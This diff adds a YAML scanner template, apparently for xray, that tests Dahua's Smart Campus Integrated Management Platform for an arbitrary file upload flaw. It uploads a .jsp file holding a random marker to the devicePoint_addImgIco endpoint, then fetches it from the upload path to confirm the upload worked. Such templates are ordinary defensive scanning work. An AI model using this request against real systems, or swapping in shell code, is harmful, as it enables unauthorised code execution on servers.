@@ -1,0 +1,36 @@
+id: poc-yaml-dahua-smart-campus-management-arbitrary-file-load
+info:
+  name: 大华-智慧园区综合管理平台-任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 大华智慧园区综合管理平台
+variables:
+  v1: md5(random_str(8))
+  boundary: random_str(10)
+requests:
+- method: POST
+  path: /emap/devicePoint_addImgIco?hasSubsystem=true
+  headers:
+    Content-Type: multipart/form-data; boundary={{.boundary}}
+  data: '--{{.boundary}}
+
+    Content-Disposition: form-data; name="upload"; filename="123.jsp"
+
+    Content-Type: application/octet-stream
+
+    Content-Transfer-Envcoding: binary
+
+
+    {{.v1}}
+
+    --{{.boundary}}--
+
+    '
+  expression: status_code == 200 && contains(body, "\"code\":1,\"data\":\"")
+  output:
+  - regex_match(body, "\"data\":\"(?P<fname>.*?)\"")
+- method: GET
+  path: /upload/emap/society_new/{{.fname}}
+  expression: status_code == 200 && contains(body, v1) && !contains(body, "<")
+transport: http
